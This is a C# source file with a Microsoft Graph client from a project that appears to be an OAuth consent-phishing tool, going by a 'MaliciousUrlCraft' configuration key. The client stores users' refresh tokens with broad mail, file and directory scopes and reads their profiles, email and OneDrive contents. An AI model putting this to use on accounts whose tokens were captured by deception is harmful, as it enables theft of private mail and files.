using Microsoft.Extensions.Configuration;
using Newtonsoft.Json;
using Maraki1982.Core.DAL;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using Maraki1982.Core.Dto.Core;
using Maraki1982.Core.Dto.Microsoft;
using Maraki1982.Core.Dto.Core.Mail;
using Maraki1982.Core.Dto.Microsoft.Mail;
using Maraki1982.Core.Models.Database;
using Maraki1982.Core.Dto.Core.Drive;
using Maraki1982.Core.Dto.Microsoft.Drive;

namespace Maraki1982.Core.VendorApi
{
    public class MsGraphApi : IExternalApi
    {
        private readonly IConfiguration _configuration;
        private readonly OAuthServerContext _context;

        public MsGraphApi(OAuthServerContext context, IConfiguration configuration)
        {
            _context = context;
            _configuration = configuration;
        }

        public Token GetToken(string idToken)
        {
            using (var client = new HttpClient())
            {
                var values = new Dictionary<string, string>
                {
                    { "client_id", _configuration["Authentication:Microsoft:ClientId"] },
                    { "client_secret", _configuration["Authentication:Microsoft:ClientSecret"] },
                    { "scope", _configuration["Authentication:Microsoft:MaliciousUrlCraft:Scope"] },
                    { "assertion", idToken },
                    { "grant_type", "urn:ietf:params:oauth:grant-type:jwt-bearer" },
                    { "requested_token_use", "on_behalf_of" }
                };

                var content = new FormUrlEncodedContent(values);
                var response = client.PostAsync(_configuration["Authentication:Microsoft:TokenUri"], content).Result;
                string msToken = response.Content.ReadAsStringAsync().Result;

                return JsonConvert.DeserializeObject<MsToken>(msToken);
            }
        }

        public Token RefreshToken(User user)
        {
            using (var client = new HttpClient())
            {
                var values = new Dictionary<string, string>
                {
                    { "client_id", _configuration["Authentication:Microsoft:ClientId"] },
                    { "client_secret", _configuration["Authentication:Microsoft:ClientSecret"] },
                    { "scope", "offline_access Directory.Read.All Directory.AccessAsUser.All files.read.all user.read mail.read openid profile" },
                    { "refresh_token", user.RefreshToken },
                    { "redirect_uri", _configuration["Authentication:Microsoft:RedirectUri"] },
                    { "grant_type", "refresh_token" }
                };

                var content = new FormUrlEncodedContent(values);
                var response = client.PostAsync(_configuration["Authentication:Microsoft:TokenUri"], content).Result;
                string msToken = response.Content.ReadAsStringAsync().Result;

                var token = JsonConvert.DeserializeObject<MsToken>(msToken);

                user.AccessToken = token.AccessToken;
                user.RefreshToken = token.RefreshToken;
                _context.Update(user);
                _context.SaveChanges();

                return token;
            }
        }

        public string GetApi(string accessToken, string url)
        {
            var request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "GET";
            request.ContentType = "application/json";
            request.Headers.Add("Authorization", "Bearer " + accessToken);

            var httpResponse = (HttpWebResponse)request.GetResponse();
            var response = string.Empty;
            using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
            {
                response = streamReader.ReadToEnd();
            }

            return response;
        }

        public PersonalInfoDto GetMe(string accessToken)
        {
            string result = GetApi(accessToken, GetUrl("/me"));
            MsPersonalInfoDto msPersonalInfo = JsonConvert.DeserializeObject<MsPersonalInfoDto>(result);
            msPersonalInfo.Name = string.Format("{0} {1}", msPersonalInfo.GivenName ?? string.Empty, msPersonalInfo.Surname ?? string.Empty);
            return msPersonalInfo;
        }

        public EmailFoldersDto GetEmailFolders(string accessToken)
        {
            string result = GetApi(accessToken, GetUrl("/me/mailFolders"));
            EmailFoldersDto emailFolders = JsonConvert.DeserializeObject<MsEmailFoldersDto>(result);
            return emailFolders;
        }

        public EmailsDto GetEmails(string accessToken, string folderId)
        {
            string result = GetApi(accessToken, GetUrl(string.Format("/me/mailFolders/{0}/messages", folderId)));
            EmailsDto emails = JsonConvert.DeserializeObject<MsEmailsDto>(result);
            return emails;
        }

        public DrivesDto GetDrives(string accessToken)
        {
            string result = GetApi(accessToken, GetUrl("/me/drives"));
            DrivesDto drives = JsonConvert.DeserializeObject<MsDrivesDto>(result);
            return drives;
        }

        public FoldersAndFilesDto GetDriveRootFolder(string accessToken, string driveId)
        {
            string result = GetApi(accessToken, GetUrl("/me/drives/" + driveId + "/root/children"));
            FoldersAndFilesDto folders = JsonConvert.DeserializeObject<MsFoldersAndFilesDto>(result);
            return folders;
        }

        public FoldersAndFilesDto GetDriveSubFolders(string accessToken, string driveId, string folderId)
        {
            string result = GetApi(accessToken, GetUrl(string.Format("/drives/{0}/items/{1}/children", driveId, folderId)));
            FoldersAndFilesDto folders = JsonConvert.DeserializeObject<MsFoldersAndFilesDto>(result);
            return folders;
        }

        public FoldersAndFilesDto GetFolderFiles(string accessToken, string driveId, string folderId)
        {
            return GetDriveSubFolders(accessToken, driveId, folderId);
        }

        private string GetUrl(string path)
        {
            return string.Format(@"{0}{1}", _configuration["Authentication:Microsoft:BaseUri"], path);
        }
    }
}
